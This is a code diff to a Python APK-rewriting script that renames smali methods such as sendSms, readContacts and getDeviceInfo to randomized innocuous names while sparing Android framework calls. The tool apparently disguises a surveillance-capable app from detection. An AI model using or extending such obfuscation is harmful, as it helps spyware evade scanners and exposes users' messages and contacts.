@@ -1824,7 +1824,7 @@ def step_6d_rename_methods(new_pkg: str) -> int:
         "disconnectSocket":       ["closeNetworkChannel","terminateServerConnection","shutdownRemoteConnection","endNetworkSession"],
         "receiveData":            ["receiveNetworkPayload","downloadDataContent","fetchServerData","pullRemoteData"],
         "checkPermissions":       ["verifyRuntimePermissions","validateAccessPermissions","checkGrantedPermissions","verifyAppPermissions"],
-        "requestPermissions":     ["requestRuntimePermissions","askAccessPermissions","requestGrantedPermissions","requestAppPermissions"],
+        "requestPermissions":     ["requestRuntimePermissions","askAccessPermissions","requestGrantedPermissions","requestUserPermissions"],
         "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
         "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
         "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
@@ -1869,8 +1869,41 @@ def step_6d_rename_methods(new_pkg: str) -> int:
         # Pure Python grep count (works on Windows AND Linux)
         count = _py_grep_count(smali_dir, orig_method)
         if count > 0:
-            # Pure Python replacement (works on Windows AND Linux)
-            _py_sed(smali_dir, orig_method, new_method)
+            # Pure Python replacement — only rename METHOD DEFINITIONS
+            # NOT framework invoke-virtual calls (e.g. Activity->requestPermissions)
+            # This prevents corrupting Android framework API calls
+            import re as _re6d
+            for _root6d, _dirs6d, _files6d in os.walk(smali_dir):
+                for _fname6d in _files6d:
+                    if not _fname6d.endswith(".smali"):
+                        continue
+                    _fpath6d = os.path.join(_root6d, _fname6d)
+                    try:
+                        with open(_fpath6d, "r", encoding="utf-8", errors="replace") as _f6d:
+                            _fc6d = _f6d.read()
+                        if orig_method not in _fc6d:
+                            continue
+                        # Only replace in .method declarations, not framework invoke calls
+                        # Framework calls look like: Landroid/...;->methodName or Ljava/...;->methodName
+                        # Safe to replace: lines starting with .method or within companion class calls
+                        _lines6d = _fc6d.splitlines(keepends=True)
+                        _changed6d = False
+                        _new_lines6d = []
+                        for _line6d in _lines6d:
+                            if orig_method in _line6d:
+                                # Skip if this is a framework invoke call
+                                if _re6d.search(r'L(android|java|javax|kotlin|dalvik)/', _line6d) and '->' + orig_method in _line6d:
+                                    _new_lines6d.append(_line6d)
+                                else:
+                                    _new_lines6d.append(_line6d.replace(orig_method, new_method))
+                                    _changed6d = True
+                            else:
+                                _new_lines6d.append(_line6d)
+                        if _changed6d:
+                            with open(_fpath6d, "w", encoding="utf-8") as _f6d:
+                                _f6d.write("".join(_new_lines6d))
+                    except Exception:
+                        pass
             renamed += count
 
     print(f"  ✅ Renamed custom methods in {renamed} files")
